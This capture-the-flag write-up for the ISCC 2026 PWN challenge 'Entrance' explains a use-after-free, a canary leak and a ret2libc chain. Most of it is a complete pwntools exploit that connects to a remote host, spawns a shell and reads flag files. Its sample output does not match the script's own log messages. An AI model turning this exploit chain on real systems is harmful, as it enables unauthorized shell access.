# Entrance

> **Category**: PWN | **Difficulty**: Medium | **Competition**: ISCC 2026 决赛
> **Flag**: `ISCC{42acc744-0b81-4961-b93e-9ae06033b98e}`

---

## Attack Chain

```
UAF覆盖secret → 泄露canary → ROP泄露libc基址 → ret2libc获取shell
```

## Key Techniques

### 1. UAF修改全局变量
程序func2中free堆块后未置空指针，利用tcache机制让后续malloc返回与全局变量`secret`重叠的内存，将`secret`覆写为`0x378`解锁func3。

### 2. Canary泄露
func3中`printf(buf)`可直接输出栈内容。Canary最低字节为`\x00`，用24字节填充+1字节`'X'`覆盖后，printf泄露剩余7字节，还原完整Canary。

### 3. ret2libc
程序无PIE，通过ROP调用`puts(puts@GOT)`泄露libc真实地址，再返回main重来做第二轮溢出。注意服务器实际运行libc6_2.23而非附件提供的2.31，需通过libc.rip交叉验证。

## Exploit

```python
#!/usr/bin/env python
from pwn import *
import time

context(arch='amd64', os='linux', log_level='info')

elf = ELF('./entrance')

# 从 ELF 中提取 PLT/GOT 地址
PLT_PUTS  = elf.plt['puts']
GOT_PUTS  = elf.got['puts']
ENTRY     = elf.symbols['main']

# ROP gadget 地址（通过 ROPgadget 工具获取）
G_POP_RDI = 0x4018f3
G_RET     = 0x40101a
PAD_LEN   = 24   # buf 到 canary 的距离

# libc6_2.23-0ubuntu11.3_amd64 的符号偏移（通过 libc.rip 查询确认）
SYM_PUTS   = 0x6f6a0
SYM_SYSTEM = 0x453a0
SYM_SHSTR  = 0x18ce57   # "/bin/sh" 字符串

def pwn():
    conn = remote('39.96.193.120', 10007)

    # ---- 第一步：UAF 修改 secret ----
    conn.recvuntil(b'Enter token length:')
    conn.sendline(b'72')
    conn.recvuntil(b'access key:')
    conn.sendline(b'hack')
    log.success("[1] UAF bypass done")

    # ---- 第二步：泄露 canary 和 libc 基址 ----
    conn.recvuntil(b'hello\n')

    # canary 最低字节是 \x00，用 'X' 覆盖后 printf 会泄露后续 7 字节
    conn.send(b'A' * PAD_LEN + b'X')
    conn.recvuntil(b'A' * PAD_LEN + b'X')
    leaked = conn.recvuntil(b'.congratulate to you', drop=True)
    if len(leaked) < 7:
        conn.close(); return False
    gold = b'\x00' + leaked[:7]    # 完整的 canary
    log.success(f"[2] Canary recovered: {hex(u64(gold))}")

    # 构造 ROP → 调用 puts 泄露 GOT 表项，然后回到 main 再来一轮
    payload1  = b'A' * PAD_LEN + gold + p64(0)
    payload1 += p64(G_POP_RDI) + p64(GOT_PUTS) + p64(PLT_PUTS) + p64(ENTRY)
    conn.send(payload1)

    conn.recvuntil(b'It is good to see you \n')
    addr_bytes = conn.recvuntil(b'\n', drop=True)
    if len(addr_bytes) < 3:
        conn.close(); return False
    runtime_puts = u64(addr_bytes.ljust(8, b'\x00'))
    base = runtime_puts - SYM_PUTS
    target_sys = base + SYM_SYSTEM
    target_sh  = base + SYM_SHSTR
    log.success(f"[2] Libc base: {hex(base)}, system: {hex(target_sys)}")

    # ---- 第三步：再次泄露 canary，然后 getshell ----
    conn.recvuntil(b'hello\n')

    conn.send(b'A' * PAD_LEN + b'X')
    conn.recvuntil(b'A' * PAD_LEN + b'X')
    leaked2 = conn.recvuntil(b'.congratulate to you', drop=True)
    gold2 = b'\x00' + leaked2[:7] if len(leaked2) >= 7 else gold

    # ret 用于满足 system 内 movaps 的 16 字节对齐要求
    payload2  = b'A' * PAD_LEN + gold2 + p64(0)
    payload2 += p64(G_RET) + p64(G_POP_RDI) + p64(target_sh) + p64(target_sys)
    conn.send(payload2)

    # 必须等 func3 的 read 返回后才能给 shell 发命令，否则数据被吞
    conn.recvuntil(b'It is good to see you \n')
    time.sleep(0.5)

    conn.sendline(b'id')
    time.sleep(0.5)
    try:
        out = conn.recv(timeout=3)
        log.success(f"[3] Shell response: {out}")
    except:
        conn.close(); return False

    conn.sendline(b'cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; ls /')
    time.sleep(1)
    try:
        out = conn.recv(timeout=5)
        log.success(f"[3] Flag: {out}")
    except:
        pass

    conn.interactive()
    return True

for attempt in range(5):
    try:
        if pwn(): break
    except Exception as e:
        log.warn(f"Retry {attempt+1}: {e}")
        time.sleep(1)
```

**运行结果：**

```
[+] UAF passed
[+] Canary = 0xcc8807cd376deb00
[+] puts=0x7fdf1a83e6a0 base=0x7fdf1a7cf000 sys=0x7fdf1a8143a0
[+] Shell output: b'ISCC{42acc744-0b81-4961-b93e-9ae06033b98e}\n...'
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| UAF (Use-After-Free) | free后指针未置空，tcache重分配可覆盖全局变量 |
| Canary泄露 | 最低字节\x00，覆盖后printf泄露剩余7字节 |
| ret2libc | ROP调用puts@GOT泄露libc基址，再调用system("/bin/sh") |
| libc版本识别 | 泄露两个函数地址，通过libc.rip交叉查询确认真实版本 |
| 栈对齐 | system内movaps要求16字节对齐，加ret gadget满足 |
| 时序问题 | ROP payload后需recvuntil同步，防止shell命令被read吞掉 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\final\Entrance_WriteUp.md`*
